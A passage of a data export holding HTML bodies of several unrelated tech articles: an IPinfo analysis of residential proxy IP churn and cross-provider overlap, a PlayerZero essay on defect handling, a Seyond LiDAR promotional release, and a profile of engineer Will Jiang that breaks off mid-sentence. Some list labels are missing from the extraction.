IPs</strong>&nbsp;over a 90-day window shows that these addresses rotate so quickly that historical reputation becomes unreliable. On average, a residential proxy IP is visible for just 4.56 days. That average hides a major split:</p><ul></ul><p>This short lifespan explains why most residential proxy IPs never accumulate meaningful history. Most IPs disappear before reputation can form.</p><p><strong>60% of residential proxy IPs are observed only once</strong>&nbsp;during the 90-day period. In other words, a majority of IPs vanish after a single appearance. This effect is overwhelmingly driven by IPv6, while IPv4 also presents a high churn:</p><ul><li>&nbsp;33% observed once during the 90-day period.</li><li>&nbsp;87% observed once during the 90-day period.</li></ul><p>Even when IPs do return, they do so inconsistently. Only 9% of IPs are reobserved within 7 days:</p><ul><li>&nbsp;18% reobserved within 7 days</li><li>&nbsp;0.6% reobserved within 7 days</li></ul><p>78% of IPs do not persist beyond 30 days from first observation:</p><ul><li>: 59% drop out beyond 30 days</li><li>: 99% drop out beyond 30 days</li></ul><p>Just 22% reappear after 30 days, almost entirely driven by IPv4:</p><ul><li>: 41% reappear after 30 days</li><li>: 1% reappear after 30 days</li></ul><p>&nbsp;Residential proxy IPs don't simply churn out, they rotate. The same addresses cycle between active proxy use and dormancy multiple times per month. An IP might route attacks Monday, disappear Tuesday-Thursday, reappear Friday, then vanish again the next week. They cycle in and out of proxy use faster than reputation systems can detect, score, and respond especially for IPv6, where persistence is nearly nonexistent.</p><p><strong>This rotation speed destroys the foundation of IP reputation systems.</strong></p><p>Traditional IP reputation models work by building historical profiles: \"This IP has been associated with fraud, so flag it as high-risk.\" But when IPs cycle between proxy and legitimate use multiple times per month, what does historical reputation represent?</p><ul><li><strong>Scoring normal users as fraudsters</strong>&nbsp;because they inherited an IP that was briefly used as a proxy last week</li><li><strong>Giving actual proxy traffic a clean score</strong>&nbsp;because the IP doesn't have enough historical data yet</li></ul><p>Risk scoring models face the same problem. They aggregate behavior over time to calculate scores. But by the time an IP accumulates enough \"bad behavior\" to trigger a high risk score, it's already cycled out of the proxy pool and back to legitimate residential use. The lag between detection and scoring makes the data perpetually stale.</p><h2>The Overlap Problem Makes It Worse</h2><p>Our January 2026 analysis revealed that rotation isn't the only issue, it's reuse at scale:</p><ul><li>46% of residential proxy IPs appear in 2+ provider networks (79M out of 170M IPs)</li><li>19% appear in 5+ providers (33M IPs)</li><li>9% appear in 10+ providers (15M IPs)</li><li>Some IPs appear in up to 98 different provider pools (0.3% appear in 50+ providers)</li></ul><p>This means the same compromised infrastructure is being accessed through multiple proxy services. Fraudsters don't need to switch infrastructure: they just switch which provider they're buying access through.</p><p><strong>Examples from our December 2025 data:</strong></p><p>These heavily shared IPs appear across almost all major residential proxy providers, including netnut, 922proxy, oxylabs, brightdata, smartproxy, lunaproxy, and dozens of others. They're likely sourced from large ISP pools that multiple providers tap into, or from the same upstream malware networks that feed multiple services.</p><h2>Why This Breaks Detection</h2><p>The residential proxy ecosystem is more interconnected than most fraud teams realize. Many providers aren't operating independent infrastructure, they're sourcing from the same underlying pools:</p><ul><li>The same compromised routers accessed through different services</li><li>The same P2P bandwidth-sharing apps white-labeled under different brands</li><li>The same malware networks feeding multiple proxy providers</li></ul><p>&nbsp;Provider identity alone isn't a strong enough signal.</p><p>If your detection system flags IPs \"from Bright Data\" but the same IPs are simultaneously available through eight other providers, what happens when an attacker switches services? Your system doesn't recognize it as the same infrastructure. The IP that was flagged yesterday gets through today because it's accessing through a different provider.</p><p>This overlap pollutes IP reputation data and inflates false negatives. An IP might have a clean reputation score because it's only been flagged on one provider, while the other seven providers offering access to the same IP haven't been detected yet.</p><h2>Beyond Residential: Mobile and Datacenter Proxies</h2><p>The proxy landscape extends beyond traditional residential IPs. As of December 2025, IPinfo tracks the full spectrum:</p><p>&nbsp;route traffic through cellular networks: real smartphones and mobile devices running proxy apps. These are particularly challenging because mobile IPs are frequently shared across many devices through carrier-grade NAT. An IP that looks like a single mobile user might actually be serving hundreds of devices. We tag these with a <em>mobile suffix (e.g., soax</em>mobile) because they require different risk assessment than standard residential proxies.</p><p>&nbsp;use hosting infrastructure rather than residential ISPs. Providers like Bright Data and Oxylabs offer datacenter proxy pools alongside their residential offerings. While datacenter IPs are theoretically easier to detect (they come from known hosting ASNs), commercial datacenter proxies from major providers are still widely used for fraud and scraping. As of December 2025, we track datacenter proxies from six major providers: Bright Data, ByteZero, DataImpulse, Decodo, Geonode, and Oxylabs flagging them with a _datacenter suffix.</p><p>This distinction matters because mobile and datacenter proxies have different characteristics and require different detection strategies, but they're all part of the same abuse ecosystem.</p><h2>What Actually Works: Context Over Direct Observation</h2><p>When IPs cycle between active and dormant states within hours, when the pool refreshes weekly with mostly new addresses, and when the same IPs are accessible through multiple providers simultaneously, you need a detection approach that adapts to this reality.</p><p>This is where direct observation makes the difference. Because IPinfo subscribes to residential proxy services and actively connects through them, we can see patterns that inference-based detection misses.</p><p>More importantly, we can provide the contextual signals that help fraud teams make intelligent decisions despite this complexity:</p><p>&nbsp;- When was this IP last observed actively routing through a proxy network? An IP last seen 30 days ago is fundamentally different from one active yesterday. Recency is the strongest signal.</p><p>&nbsp;- Has this IP been consistently in proxy pools (high persistence = higher risk) or is it newly rotated in? Distinguishing persistent infrastructure from transient rotation matters enormously.</p><p>&nbsp;- While we show which provider was most frequently observed, the real value is knowing the IP was detected through direct observation across 103 networks, not inference. We're not guessing based on subnet patterns or behavioral signals.</p><p><strong>Mobile and datacenter tagging</strong>&nbsp;- IPs routing through carrier networks or hosting infrastructure get tagged with _mobile or _datacenter suffixes, because these proxy types behave differently and require different risk models.</p><p>These temporal signals matter because they reflect current state, not historical reputation.</p><h2>A Better Standard for Residential Proxy Detection</h2><p>Traditional approaches: IP reputation databases, risk scoring models, behavioral inference were built for a world of static datacenter proxies. They struggle with residential proxies because they can't keep pace with rotation or account for cross-provider reuse.</p><p>Any organization evaluating residential proxy data should ask:</p><ul><li><strong>How was this IP detected?</strong>&nbsp;Direct observation or inferred from patterns?</li><li><strong>How current is this data?</strong>&nbsp;Daily updates or stale lists? With over half of proxy IPs appearing only once even in a 7-day window, yesterday’s data is already outdated.</li><li><strong>What temporal context is provided?</strong>&nbsp;When was it last seen active? How persistently has it appeared?</li><li><strong>Are mobile and datacenter proxies distinguished?</strong>&nbsp;Different types require different handling.</li><li><strong>Can you explain this flag to compliance?</strong>&nbsp;Clear detection methodology matters.</li></ul><p>At IPinfo, our approach starts with verification-based detection: subscribing to proxy services and directly observing which IPs are in active use. As of January 2026, we track 101 residential proxy providers and multiple datacenter and mobile proxy providers. This direct observation across 147 million IPs is what allowed us to discover the cross-provider overlap and rapid daily churn patterns and it's what enables us to provide temporal context that adapts to this reality.</p><p>Because when residential proxy IPs alternate between malicious and legitimate use within hours, when the IP pool refreshes weekly with mostly new addresses, when the same IPs are simultaneously accessible through multiple providers, and when mobile and datacenter proxies add additional complexity, historical reputation becomes noise.</p><p>What matters is knowing which IPs are active threats right now, understanding what type of proxy infrastructure they represent, and having the temporal context to make intelligent risk decisions despite the complexity.</p>",

      "content": "<p>Engineering teams are shipping more code than ever, driven by distributed systems and AI-assisted development. Defect prevention and resolution, however, still operate as manual, reactive work.</p><p>This creates a structural imbalance: output scales, but reliability and confidence do not. Teams feel constantly busy yet perpetually behind, a signal that the operating model itself is no longer keeping pace.</p><p>What’s changed isn’t that teams care less about quality. It’s that the surface area of modern software has expanded faster than the mechanisms teams use to understand what broke, why it broke, and how to keep it from happening again.</p><h2><strong>Why ad hoc defect handling creates hero dependency</strong></h2><p>Most teams still handle defects in a reactive and ad hoc way. A customer reports an issue, someone drops a link in Slack, a few people start pulling logs, and an engineer who “knows that part of the system” gets tagged. Maybe there’s a runbook. Maybe there’s a Jira ticket with partial context. Maybe someone remembers a similar incident from six months ago, if the right person is online.</p><p>At small scale, this can feel like flexibility. In practice, it quietly creates a dependency chain.</p><p>As systems grow, a small group of senior engineers becomes the de facto source of truth, not just for resolving incidents, but for noticing patterns that could prevent future ones. They’re the people who know where the sharp edges are, which services are coupled in surprising ways, and what a “normal” trace looks like when things are healthy. They’re also the people who can translate between a customer-facing symptom and a code-level cause.</p><p>Everyone else learns a different lesson: when something is unclear, escalate.</p><p>Support and QA teams rely on engineering to come and help them solve problems, rather than autonomy, because the fastest path to a correct answer is often “ask the one person who’s seen this before.” Over time, this pushes engineering teams into constant firefighting, where effort goes toward reacting to issues instead of reducing their recurrence.</p><p>The real cost is not just slower fixes, but exhaustion, fragility, and missed opportunities for prevention when those heroes are unavailable. Not to mention slowed innovation when engineering teams spend all their time on support escalations.</p><p>Hero dependency isn’t entirely&nbsp; a cultural problem. It’s a predictable outcome of misalignment across three systems that every defect touches.</p><p>First, people are misaligned. Support, engineering, QA, and product each see the defect through different lenses.</p><ul><li>Support sees customer impact and urgency.</li><li>QA sees reproduction steps and release risk.</li><li>Engineers see traces, code paths, and deployments.</li><li>Product sees roadmap implications and user trust.</li></ul><p>None of these perspectives are wrong, but they become costly when they can’t be reconciled quickly and reliably.</p><p>Second, process is misaligned. Even in well-run organizations, defect handling often lives in the shadow of “the real work.” Steps vary depending on who’s involved, how urgent the issue feels, and what information is available. One engineer starts from an alert, another starts from a support ticket, another asks the customer for a screen recording. Teams improvise because the process isn’t codified tightly enough to survive pressure.</p><p>Third, context is misaligned. The information needed to understand an issue is scattered across tools and teams: code repositories, tickets, logs, traces, session data, release notes, retros, and institutional knowledge. Manual coordination, asking around, searching dashboards, and stitching together screenshots cannot keep pace with increasing services, higher release velocity, and larger, more specialized teams.</p><p>As complexity rises, context decays faster than it can be shared. Processes become brittle under pressure. People revert to escalation and rework. The system becomes reactive by default, even when everyone is trying to do the right thing.</p><h2><strong>From human-led coordination to system-maintained context</strong></h2><p>For decades, software teams relied on a familiar operating model: people, process, technology. It worked under a specific set of conditions—when systems were smaller, release velocity was slower, and most critical knowledge could reasonably live in people’s heads.</p><p>In that world, coordination was human-led. Engineers knew which dashboards mattered. Senior team members remembered what happened last time. Runbooks stayed accurate because the same people touched the same systems repeatedly. When something broke, experience and informal coordination filled in the gaps.</p><p>That model didn’t fail overnight. It’s been under strain for years as systems grew more distributed and teams more specialized. Manual coordination has a natural ceiling, and as services, integrations, and deployments multiplied, the gap between what the organization was building and what any individual could fully understand widened. Processes became harder to enforce, and context decayed faster than it could be shared.</p><p>AI pushed this tension past its breaking point.</p><p>With AI-assisted development, the volume and speed of code creation have increased dramatically. Writing new lines of code is no longer the bottleneck. Technology itself has become increasingly commoditized. What hasn’t kept pace is the organization’s ability to understand how all that code behaves in production, how changes interact across systems, and how specific user experiences map back to underlying causes.</p><p>In this environment, context, not technology, is the limiting factor. The challenge is no longer having the right tools, but maintaining shared, continuous understanding as work unfolds. Teams don’t struggle because they lack dashboards or automation; they struggle because the information required to act confidently is fragmented, ephemeral, and person-dependent.</p><p>That’s why the traditional people, process, technology model is evolving into people, process, context. AI doesn’t create leverage simply by generating code or answering questions. It creates leverage by maintaining, connecting, and applying context at a scale humans cannot sustain on their own.</p><p>Modern defect handling requires an operating model built on three interdependent systems:</p><ul><li>People, who make judgment calls and own outcomes</li><li>Process, which ensures defect work is repeatable rather than improvised</li><li>Context, which grounds every decision in shared, explainable understanding</li></ul><p>The goal isn’t to replace expertise. It’s to stop making expertise the only thing holding the system together. Instead of concentrating knowledge in a few individuals, people, process, and context work together as reinforcing systems, allowing organizations to scale reliability without scaling fragility.</p><h2><strong>People: enabling every role to act with confidence</strong></h2><p>Defect work spans support, engineering, QA, and product. Yet in most organizations, only a narrow set of roles, usually senior engineers, can move from “a symptom exists” to “we know what’s happening and what to do next” without escalation.</p><p>This isn’t because support, QA, or product lack capability. It’s because expertise is concentrated in people’s heads instead of being available in the system. The result is constant handoffs. Support relays a customer complaint. QA tries to reproduce it. Engineering infers what might have happened. Product weighs urgency without full visibility. Each step introduces latency and distortion, and each reinforces dependency on the same few individuals.</p><p>The People pillar is about distributing that expertise, not replacing senior engineers, but making their knowledge available so others can act with the same confidence. Instead of “ask the one person who knows,” the model shifts toward “the understanding is available when it’s needed.”</p><p>When people share the same underlying understanding, the defect lifecycle changes. Support can triage without guessing because they can ground decisions in what actually happened. QA can validate fixes with confidence because tests map back to real scenarios. Engineers can investigate without recreating issues from scratch, because the relevant signals are already connected.</p><p>Humans remain in control of decisions, but they no longer carry the entire cognitive burden alone. Instead of relying on a few heroes to translate between worlds, the organization distributes competence across roles, without diluting quality.</p><h2><strong>Process: making defect handling repeatable, not improvised</strong></h2><p>The phrase “defect resolution” is accurate, but in practice it usually describes one messy stream of work: investigating, prioritizing, fixing, validating, communicating, and learning. In this piece, it’s more useful to think of all of that as defect handling, because the most important shift isn’t adopting a new tool—it’s creating a repeatable flow that holds together under pressure.</p><p>Most teams resist “process” because they’ve experienced it as bureaucracy. Checklists that slow things down. Rigid steps that don’t reflect how work actually happens. Documentation that exists to satisfy audits, not to help people move faster. When systems were smaller, teams could afford to bypass formal process and rely on judgment and speed instead.</p><p>But the absence of process doesn’t eliminate overhead. It just pushes it into Slack threads, ad hoc decisions, and repeated debates about what to do next. As scale increases, that approach breaks down. When urgency spikes, steps get skipped.</p><p>When ownership is unclear, investigations get duplicated. When systems of record fall out of sync, teams lose confidence in what’s current and correct. Even high-performing organizations end up with defect handling that depends on who’s online, which tool the issue surfaced in, and how much context happens to be preserved.</p><p>The Process pillar is about fixing this, not by restricting where people work, but by embracing the tools teams already use and keeping the process intact across them.</p><p>Modern defect handling flows through many systems: Slack conversations, support tickets in Zendesk or ServiceNow, engineering backlogs in Jira, Linear, or Azure DevOps. Process only works if those systems stay connected and up to date. If context lives in Slack but the ticket is stale, or if decisions are made in one tool and never reflected elsewhere, the process quietly breaks.</p><p>That’s why repeatable process today must include tooling as a first-class component. Codified workflows define how issues are triaged, investigated, and validated—but integrations ensure that work done in any system updates the systems of record automatically. Teams don’t have to abandon Slack to follow process. They don’t have to copy-paste between tools to keep records accurate. Wherever the work starts, the process stays intact.</p><p>In this model, workflows act as guardrails rather than gates. Signals from support systems can trigger investigations automatically. Tickets can be summarized and acted on without leaving the investigation flow. Conversations, attachments, and decisions made in Slack become part of the audit trail instead of disappearing into scrollback. Process adapts to how teams work, instead of forcing teams to adapt to the process.</p><p>Process, in this sense, is not about control for its own sake. It’s what makes quality predictable and sustainable at scale. It’s also what makes prevention possible. You can’t reliably prevent defects if every incident is handled differently, or if the information that mattered never makes it back into the systems teams rely on. Prevention requires recurrence awareness, consistent capture of signals across tools, and feedback loops that actually close.</p><p>When defect handling has shape, continuity, and integration across the tools teams already use, organizations don’t just resolve issues faster. They reduce rework, preserve learning, and improve reliability over time—without slowing teams down or forcing them into unnatural workflows.</p><h2><strong>Context: the difference between guessing and knowing</strong></h2><p>People and process both depend on one thing: context. When context is weak or fragmented, even the best teams and the cleanest workflows break down. That’s because every decision in defect handling—what to investigate, who should act, whether a fix is correct—ultimately rests on how well the system explains what actually happened.</p><p>Fragmented context usually looks like this: a user reports an issue, and critical information is scattered across code repositories, tickets and issue trackers, logs and telemetry, session data, and past incidents. Each source holds a piece of the truth, but none of them tell the full story on their own. Manual aggregation, asking around, switching dashboards, and stitching together screenshots does not scale. As systems grow, root cause analysis slows, confidence in fixes erodes, and knowledge remains person-dependent.</p><p>Unified context means something very different from “all the data in one place.” It means the system maintains connections across signals, so information isn’t just collected—it’s understood.</p><p>Instead of isolated logs and traces, context becomes a set of relationships:</p><p><em>user action → code path → system behavior → customer impact</em>.</p><p>That semantic understanding is what turns raw data into something teams can reason about together.</p><p>When context is shared and explainable, defect handling shifts from speculation to understanding. Instead of asking, “What might have happened?” teams can ask, “What did happen?” and “What does it connect to?” Back-and-forth decreases because fewer assumptions need to be validated. Reproduction time drops because the path from symptom to cause is clearer. Collaboration improves because people across roles are operating from the same underlying picture, even if they’re looking at it through different lenses.</p><p>This is also what makes the People and Process pillars actually work. People can act independently because the context is clear, without needing interpretation from a senior engineer. Process can be codified because each step has the information it needs to move forward without guesswork or reinvention.</p><p>Context is also the foundation for prevention. When teams can see connections across incidents, they can prioritize fixes that address underlying causes rather than treating symptoms in isolation. Over time, this reduces the likelihood of entire classes of defects recurring, not because teams are trying harder, but because the system makes patterns visible and learnable.</p><h2><strong>Why AI-native orchestration is now required</strong></h2><p>AI doesn’t create leverage as a standalone assistant. A generic chatbot can draft a response or suggest a hypothesis, but it can’t reliably align people, process, and context inside a real engineering organization.</p><p>The reason is simple: defect investigations are not static. Understanding which data matters for a specific issue requires semantic reasoning across code, logs, tickets, and observed behavior—and that reasoning changes as the investigation unfolds. A workflow tool can enforce steps. A chatbot can answer questions. But neither can determine which context is relevant right now, who needs to be involved next, or how this investigation should progress based on your organization’s actual process.</p><p>This is where most AI tooling breaks down. Static rules assume predictable paths. Generic assistants operate in isolation, offering suggestions without awareness of team ownership, documentation requirements, or downstream impact. In real defect work, those assumptions don’t hold. Investigations evolve as new signals appear, hypotheses change, and decisions narrow. Keeping work aligned requires more than answers—it requires coordination.</p><p>Real leverage comes from AI-native orchestration: AI that can follow your organization’s process, connect signals across systems, update the systems of record, and loop in the right people at the right moments. Orchestration doesn’t “solve” problems in a vacuum. It ensures investigations stay grounded in shared context, move through the correct workflows, and leave the organization more informed than it was before.</p><p>With orchestration, each investigation does more than resolve the immediate issue. It strengthens the system’s ability to respond when similar situations arise. Knowledge is preserved, documentation stays current, and coordination overhead drops because the system retains what mattered and makes it usable again.</p><p>AI-native platforms can maintain alignment where human coordination alone cannot. The goal isn’t automation without oversight, it’s scale with clarity and control. Humans remain responsible for judgment and decisions, while the platform ensures defect work stays aligned with process, context, and organizational reality as complexity grows.</p><h2><strong>How PlayerZero operationalizes people, process, and context</strong></h2><p>PlayerZero is designed around the people, process, and context operating model. Rather than adding another tool to the stack, it changes how defect work flows across roles. Alignment isn’t something teams manually maintain through handoffs or institutional knowledge; it’s something the system enforces and strengthens as work happens.</p><p>Instead of relying on individuals to remember where to look, who to involve, or how an investigation should progress, PlayerZero embeds those expectations directly into the way defects are investigated, resolved, and learned from. The value isn’t another surface to check, but a shared operating model that helps support, QA, engineering, and product converge on the same understanding and move forward together.</p><h2><strong>People: enabling shared understanding across roles</strong></h2><p>In most organizations, support, engineering, QA, and product see defects through different lenses. That difference is natural. The problem is that those perspectives rarely converge into a shared understanding fast enough to keep pace with modern systems. That’s not a people problem—it’s a system that makes expertise inaccessible unless it lives in someone’s head.</p><p>PlayerZero changes this by giving every role access to the same underlying context, translated into the level of detail they need. Instead of handoffs being the default coordination mechanism, teams align on what’s actually happening earlier in the investigation, with fewer missing pieces and less re-explanation. Decisions remain human-led, but they no longer depend on a few individuals carrying the full system in their heads.</p><p>You can see this shift in <a href=\"https://playerzero.ai/resources/case-study-cayuse\">Cayuse</a>’s experience. By gaining shared, code-aware visibility into defects across their environment, Cayuse was able to identify and resolve roughly 90% of customer-facing issues before they reached users.</p><p>That reduction wasn’t driven by heroics or added headcount; it came from making the same context available across roles, so teams could act independently with confidence. The result wasn’t just faster resolution, but a fundamentally different operating posture: less escalation by default, more autonomy with accuracy.</p><h2><strong>Process: turning defect work into a repeatable system</strong></h2><p>Defect handling typically relies on informal steps that vary by team and situation. Over time, that variability creates inconsistency, duplicated effort, and unreliable prevention, not because teams lack discipline, but because the process isn’t durable under real-world pressure.</p><p>The Process pillar addresses this by turning defect handling into a system, not a set of best intentions. Codified workflows act as guardrails for how issues are triaged, how investigations progress, and how fixes are validated before release. The goal isn’t to force every issue into the same template. It’s to ensure defect work has a clear shape, so it’s repeatable, auditable, and easier to improve over time.</p><p>Crucially, process doesn’t exist in isolation from tools. In practice, defect work already flows through systems like Jira, Linear, ServiceNow, Zendesk, and Slack. When those systems fall out of sync, the process breaks—even if teams are “following the steps.” Documenting decisions, updating tickets, preserving investigation context, and keeping systems of record current are just as important as performing the investigation itself.</p><p>This is why effective process embraces existing tools rather than trying to replace them. PlayerZero integrates directly with the systems teams already use, allowing workflows to span across tickets, alerts, conversations, and investigations without forcing context switching or duplicating data. Work can start where it naturally begins, often in Slack or a support ticket, and still follow a consistent, end-to-end process. Each step of the investigation updates the relevant systems automatically, so documentation stays current as a byproduct of doing the work, not an afterthought.</p><p>When process is codified this way, teams spend less time navigating uncertainty and more time resolving the right problems. Handoffs become cleaner because the next person doesn’t inherit a mystery; they inherit a structured investigation with clear context, provenance, and a defined stage. Just as importantly, consistent workflows make prevention possible. Recurring patterns can only be addressed systematically when issues are captured, investigated, and documented in the same way every time.</p><p><a href=\"https://playerzero.ai/resources/case-study-cyrano\">Cyrano Video</a>’s experience illustrates this shift. With structured workflows and shared context in place, their support organization was able to resolve around 40% of issues without escalating to the engineering team, without sacrificing quality. That outcome wasn’t driven by individual effort or better training. It was the result of defect handling becoming repeatable enough, and well-integrated enough, that work could be redistributed safely, reducing load on engineering while improving response speed and consistency.</p><h2><strong>Context: from scattered data to semantic understanding</strong></h2><p>Making context usable requires a fundamentally different approach. Instead of asking humans to stitch together fragments across tools, PlayerZero creates a unified context layer that persists across investigations and teams.</p><p>Context is captured at the moment an investigation begins, directly from the systems where work already happens. Conversations, artifacts, code references, and decisions are pulled into a single investigation thread, so work doesn’t start from a blank slate. These inputs aren’t treated as disposable side channels. They become first-class investigation context.</p><p>As a result, investigations produce durable outputs rather than one-off fixes. Findings are shared with stakeholders, reused by other teams, and referenced long after the original incident is closed. Context doesn’t disappear when a Slack thread scrolls out of view or when the person who debugged the issue moves on.</p><p>This is also where Context Graphs come into play. As investigations are resolved, the system retains the reasoning behind decisions, the edge cases uncovered, and the architectural context that mattered.</p><p>That knowledge is indexed and surfaced automatically when similar issues arise in the future. Institutional knowledge that once lived only in senior engineers’ heads becomes available to the broader organization. Patterns discovered during one investigation inform the next, without requiring someone to remember that “this looks familiar.”</p><p>Each resolved issue strengthens the system’s ability to support faster, more confident resolution and prevention. Past reasoning becomes available when it’s relevant, not buried in a ticket, locked in a document, or dependent on finding the right person at the right time.</p><p><a href=\"https://playerzero.ai/resources/case-study-key-data\">Key Data</a>’s experience shows what this shift looks like in practice. By working from unified, persistent context instead of reconstructing issues from scratch, their team collapsed weeks of debugging into minutes. Engineers were able to spend less time gathering information and more time applying judgment, focusing on shipping features rather than retracing steps.</p><p>Over time, shared context also enables better prevention. When teams can see how incidents connect, they can prioritize fixes that address underlying causes instead of repeatedly treating symptoms. When the system remembers what happened and why, prevention stops being aspirational and becomes operational.</p><h2><strong>When people, process, and context align</strong></h2><p>When people, process, and context align, defect prevention and resolution become predictable rather than reactive. Teams spend less time scrambling to understand what broke and more time acting on clear, shared understanding. Trust in systems and decisions increases, and organizations move from firefighting toward prevention.</p><p>In this model, defects stop looking like isolated failures or one-off incidents. Instead, patterns begin to emerge across investigations. Similar issues surface with shared context, allowing the organization to deliberately observe, reason about, and address systemic misalignment, whether that means fixing a brittle integration, refining a workflow, or correcting an architectural assumption.</p><p>In the AI era, organizations that scale reliability design for shared, explainable context, codify repeatable workflows, and use AI to orchestrate, not replace, human judgment. The goal isn’t to remove people from defect work, but to ensure their effort goes toward fixing underlying causes and preventing entire classes of defects, rather than repeatedly reacting to individual symptoms. The future of defect work is not more effort; it is better alignment. When people, process, and context are operationalized together, systems don’t just recover faster—they learn, adapt, and strengthen over time.</p><p><a href=\"https://playerzero.ai/request-demo\">Book a demo</a> to see how PlayerZero enables this operating model in practice.</p>",

Industrial sensors fail when the weather turns harsh.  addressed this gap by constructing a full spectrum of LiDAR sensors spanning from 0.01 meters to 500 meters, giving robots the visual acuity needed to operate safely among humans.</p><p>Billy Evers, VP of Sales and Marketing for the Americas and APAC regions, states that Seyond offers what few others can. <em>\"We are one of the only 3D LiDAR companies that offer a product in each individual product segment: ultra long range at 1.5m–500m, long range at 1m–250m, mid range at 0.1m–150m, and short range at 0.01m–50m.\"</em> That breadth matters because different applications require different sensing capabilities. Robotaxis need to detect objects hundreds of meters ahead at highway speeds. Warehouse robots require precision within tens of meters. Construction equipment demands durability across all conditions.</p><p>Seyond went public on the Hong Kong Stock Exchange in December 2025, valued at 11.7 billion Hong Kong dollars. The Silicon Valley company now operates as one of the few automotive-grade LiDAR manufacturing facilities in the US, a distinction that carries strategic weight for clients seeking supply chain security and regulatory compliance.</p><p>Revenue improved, driven by contracts with more than 500 clients across automotive, robotics, and intelligent traffic systems. The company's flagship Falcon and Robin series sensors power NIO vehicles and autonomous platforms worldwide, with over 600,000 Falcon units already deployed. Seyond's sensors deliver what the company calls \"image-grade\" perception, meaning resolution sharp enough to distinguish pedestrians from posts, bicycles from barriers.</p><p> depend on high-fidelity data to train machines that must grasp gravity, friction, and spatial relationships. Robots learn through synthetic simulations before deployment, but those simulations require accurate real-world inputs. LiDAR generates three-dimensional point clouds that enable autonomous systems to perceive depth, movement, and object classification in real-world environments.</p><p>Seyond's sensors capture this information across varying distances and conditions, from dusty mining sites to rain-soaked highways. Traditional vision systems falter when lighting conditions change or particles obscure the camera. LiDAR functions by emitting laser pulses and measuring their return time, creating detailed spatial maps regardless of ambient light. Evers notes that Seyond's technology enables robotics \"to see the 3D world in live motion and accurately interact with society.\"</p><p>The company also developed the first fully customizable LiDAR sensor with a scan pattern, allowing clients to tailor how the device sweeps an environment for specific use cases. A highway application might prioritize long-range forward vision, while a last-mile delivery robot needs 360-degree short-range coverage. Competitors like Ouster, Robosense, and Hesai offer sensors optimized for specific ranges, but Seyond's portfolio covers all segments, reducing integration complexity for manufacturers building diverse fleets.</p><p>Seyond pairs its hardware with OmniVidi, a perception software platform that interprets raw LiDAR data to enable semantic understanding. Sensors alone produce point clouds; perception software translates that data into actionable intelligence about lane lines, obstacles, and traffic flow. The combination allows autonomous systems to make split-second decisions, whether navigating crowded intersections or coordinating robotic arms in warehouses.</p><p>Deployment spans industries where failure carries consequences. Mining operations use Seyond's long-range sensors to detect equipment and personnel across vast sites. Rail systems rely on the technology for collision avoidance. Agricultural machinery navigates fields using mid-range LiDAR to avoid obstacles while maintaining precision. Each application demands sensors that withstand temperature extremes, vibration, and particulate exposure while maintaining accuracy.</p><p>Manufacturing in the United States positions Seyond to serve clients requiring domestic sourcing, particularly in defense and critical infrastructure sectors. The company is expanding into European and APAC markets after establishing its foothold in the Americas, targeting growth leaders and engineering teams building the next generation of autonomous platforms. Robots need to see before they can act. Seyond built the eyes.</p><p>:::tip\nThis story was distributed as a release by Jon Stojan under HackerNoon’s Business Blogging Program.</p>",

      "content": "<p>Long before “engineering” became a formal career path, it was already part of Will Jiang’s daily life.</p><p>Growing up in China, Jiang was the student teacher whom a classmate turned to when a laptop froze minutes before class. By high school, he was maintaining his school’s network infrastructure by diagnosing connectivity issues, keeping systems online, and supporting hundreds of users. What stayed with him wasn’t just the technical challenge, but the idea that thoughtfully built systems could quietly make people’s lives easier.</p><p>When it became time to go to college, Jiang initially gravitated toward physics, drawn by its ambition to explain the universe from first principles. He soon realized, however, that computer science offered something physics did not: a much faster feedback loop between effort and real-world impact. He enrolled at the University of California, Berkeley, where he earned a bachelor’s degree in Computer Science.</p><p>Beyond its strong programming curriculum, UC Berkeley's Computer Science program gave Will the foundational tools that later proved essential to his growth in engineering. Courses in statistics strengthened his skills in data analysis, experimentation, and interpreting metrics, which are core to identifying opportunities, running A/B tests, and quantifying impact. Exposure to Human-Computer Interaction principles sharpened his focus on user behavior, intuitive design, and empathetic interfaces.</p><p>Together, these subjects in statistics and HCI formed the foundation of Will's approach to growth hacking. They allowed him to pursue strategies centered on genuine usability and sustained engagement rather than short-term manipulation, aligning with his belief that products earn loyalty through respect rather than exploitation. Berkeley prepared him to understand why users adopt, retain, and champion better software.</p><h2>From Hobbyist to Engineer</h2><p>Jiang’s path into professional engineering began with a personal problem.</p><p>As an active member of the  gaming community, he built an Android client that allowed players to access live updates, posts, and statistics on their phones. The project forced him to confront real-world constraints such as device fragmentation, unreliable APIs, and the realities of mobile UI design. For the first time, he experienced the gap between understanding systems and building something people actually wanted to use.</p><p>That experience helped him land an internship at Expedia. During a company hackathon, Jiang prototyped a feature that reordered hotel and flight search results based on user behavior, something he personally wished existed as a traveler. Leadership immediately recognized its value, and the core logic remains in production to this day, nearly a decade later. This feature slightly increased the hotel conversion rate.</p><p>The lesson was clear: solving the right problem would grow the user base.</p><h2>Do Better Experiences bring More Users?</h2><p>Jiang joined Instagram (Meta) as a mobile engineer focused on user growth and UI/UX. Within three years, he was promoted to senior engineer and became responsible for shaping his team’s growth roadmap.</p><p>Growth engineering often incentivizes maximizing engagement at any cost. Jiang pushed in a different direction. He actively resisted dark patterns, which are design tricks that inflate metrics while leaving users feeling manipulated. His belief was simple: if an interface feels intuitive, users should not have to fight it. A well-designed product works even when users are distracted.</p><p>That philosophy shaped his most impactful work at Instagram: improving the multi-account experience. Many users juggle personal, professional, and creative accounts, yet switching between them once felt unnecessarily cumbersome. Jiang led a redesign that made the experience seamless.</p><p>The impact was immediate. Friction dropped, active account usage increased by tens of millions, and Instagram’s multi-account experience leapfrogged competitors like Twitter (now X) and Reddit. The feature earned  and when Meta later unified account switching across its family of apps, Instagram’s design became the model.</p><p>Beyond his work on the account switcher, Will shipped over 50 targeted improvements to Instagram's account creation, login, and recovery flows. These user-centric enhancements, ranging from smarter pre-fills and streamlined navigation to automatic signal matching and robust account linking, collectively helped tens of millions of users access the app more easily and reliably.</p><p>Inspired by his long-standing passion for intuitive mobile experiences, as an Android user since the HTC G1 and a keen observer of app evolution over more than a decade, Will made it his goal to build features that reduce friction and help users access and enjoy the app more easily. By prioritizing intuitive, frictionless experiences over manipulative tactics, he ensured these features empowered users rather than exploited them. This user-first approach also extended to his proactive participation in hackathons: from building a practical short-listing search result tool during an Expedia hackathon (a feature still live nearly a decade later, after receiving strong positive feedback) to consistently seeking opportunities to create tools people actually want to use.</p><h2>Scaling Rednote for Global Reach</h2><p>After Instagram, Jiang joined Xiaohongshu, internationally known as Rednote or Little Red Book, a platform that blends content, commerce, and community.</p><p>As 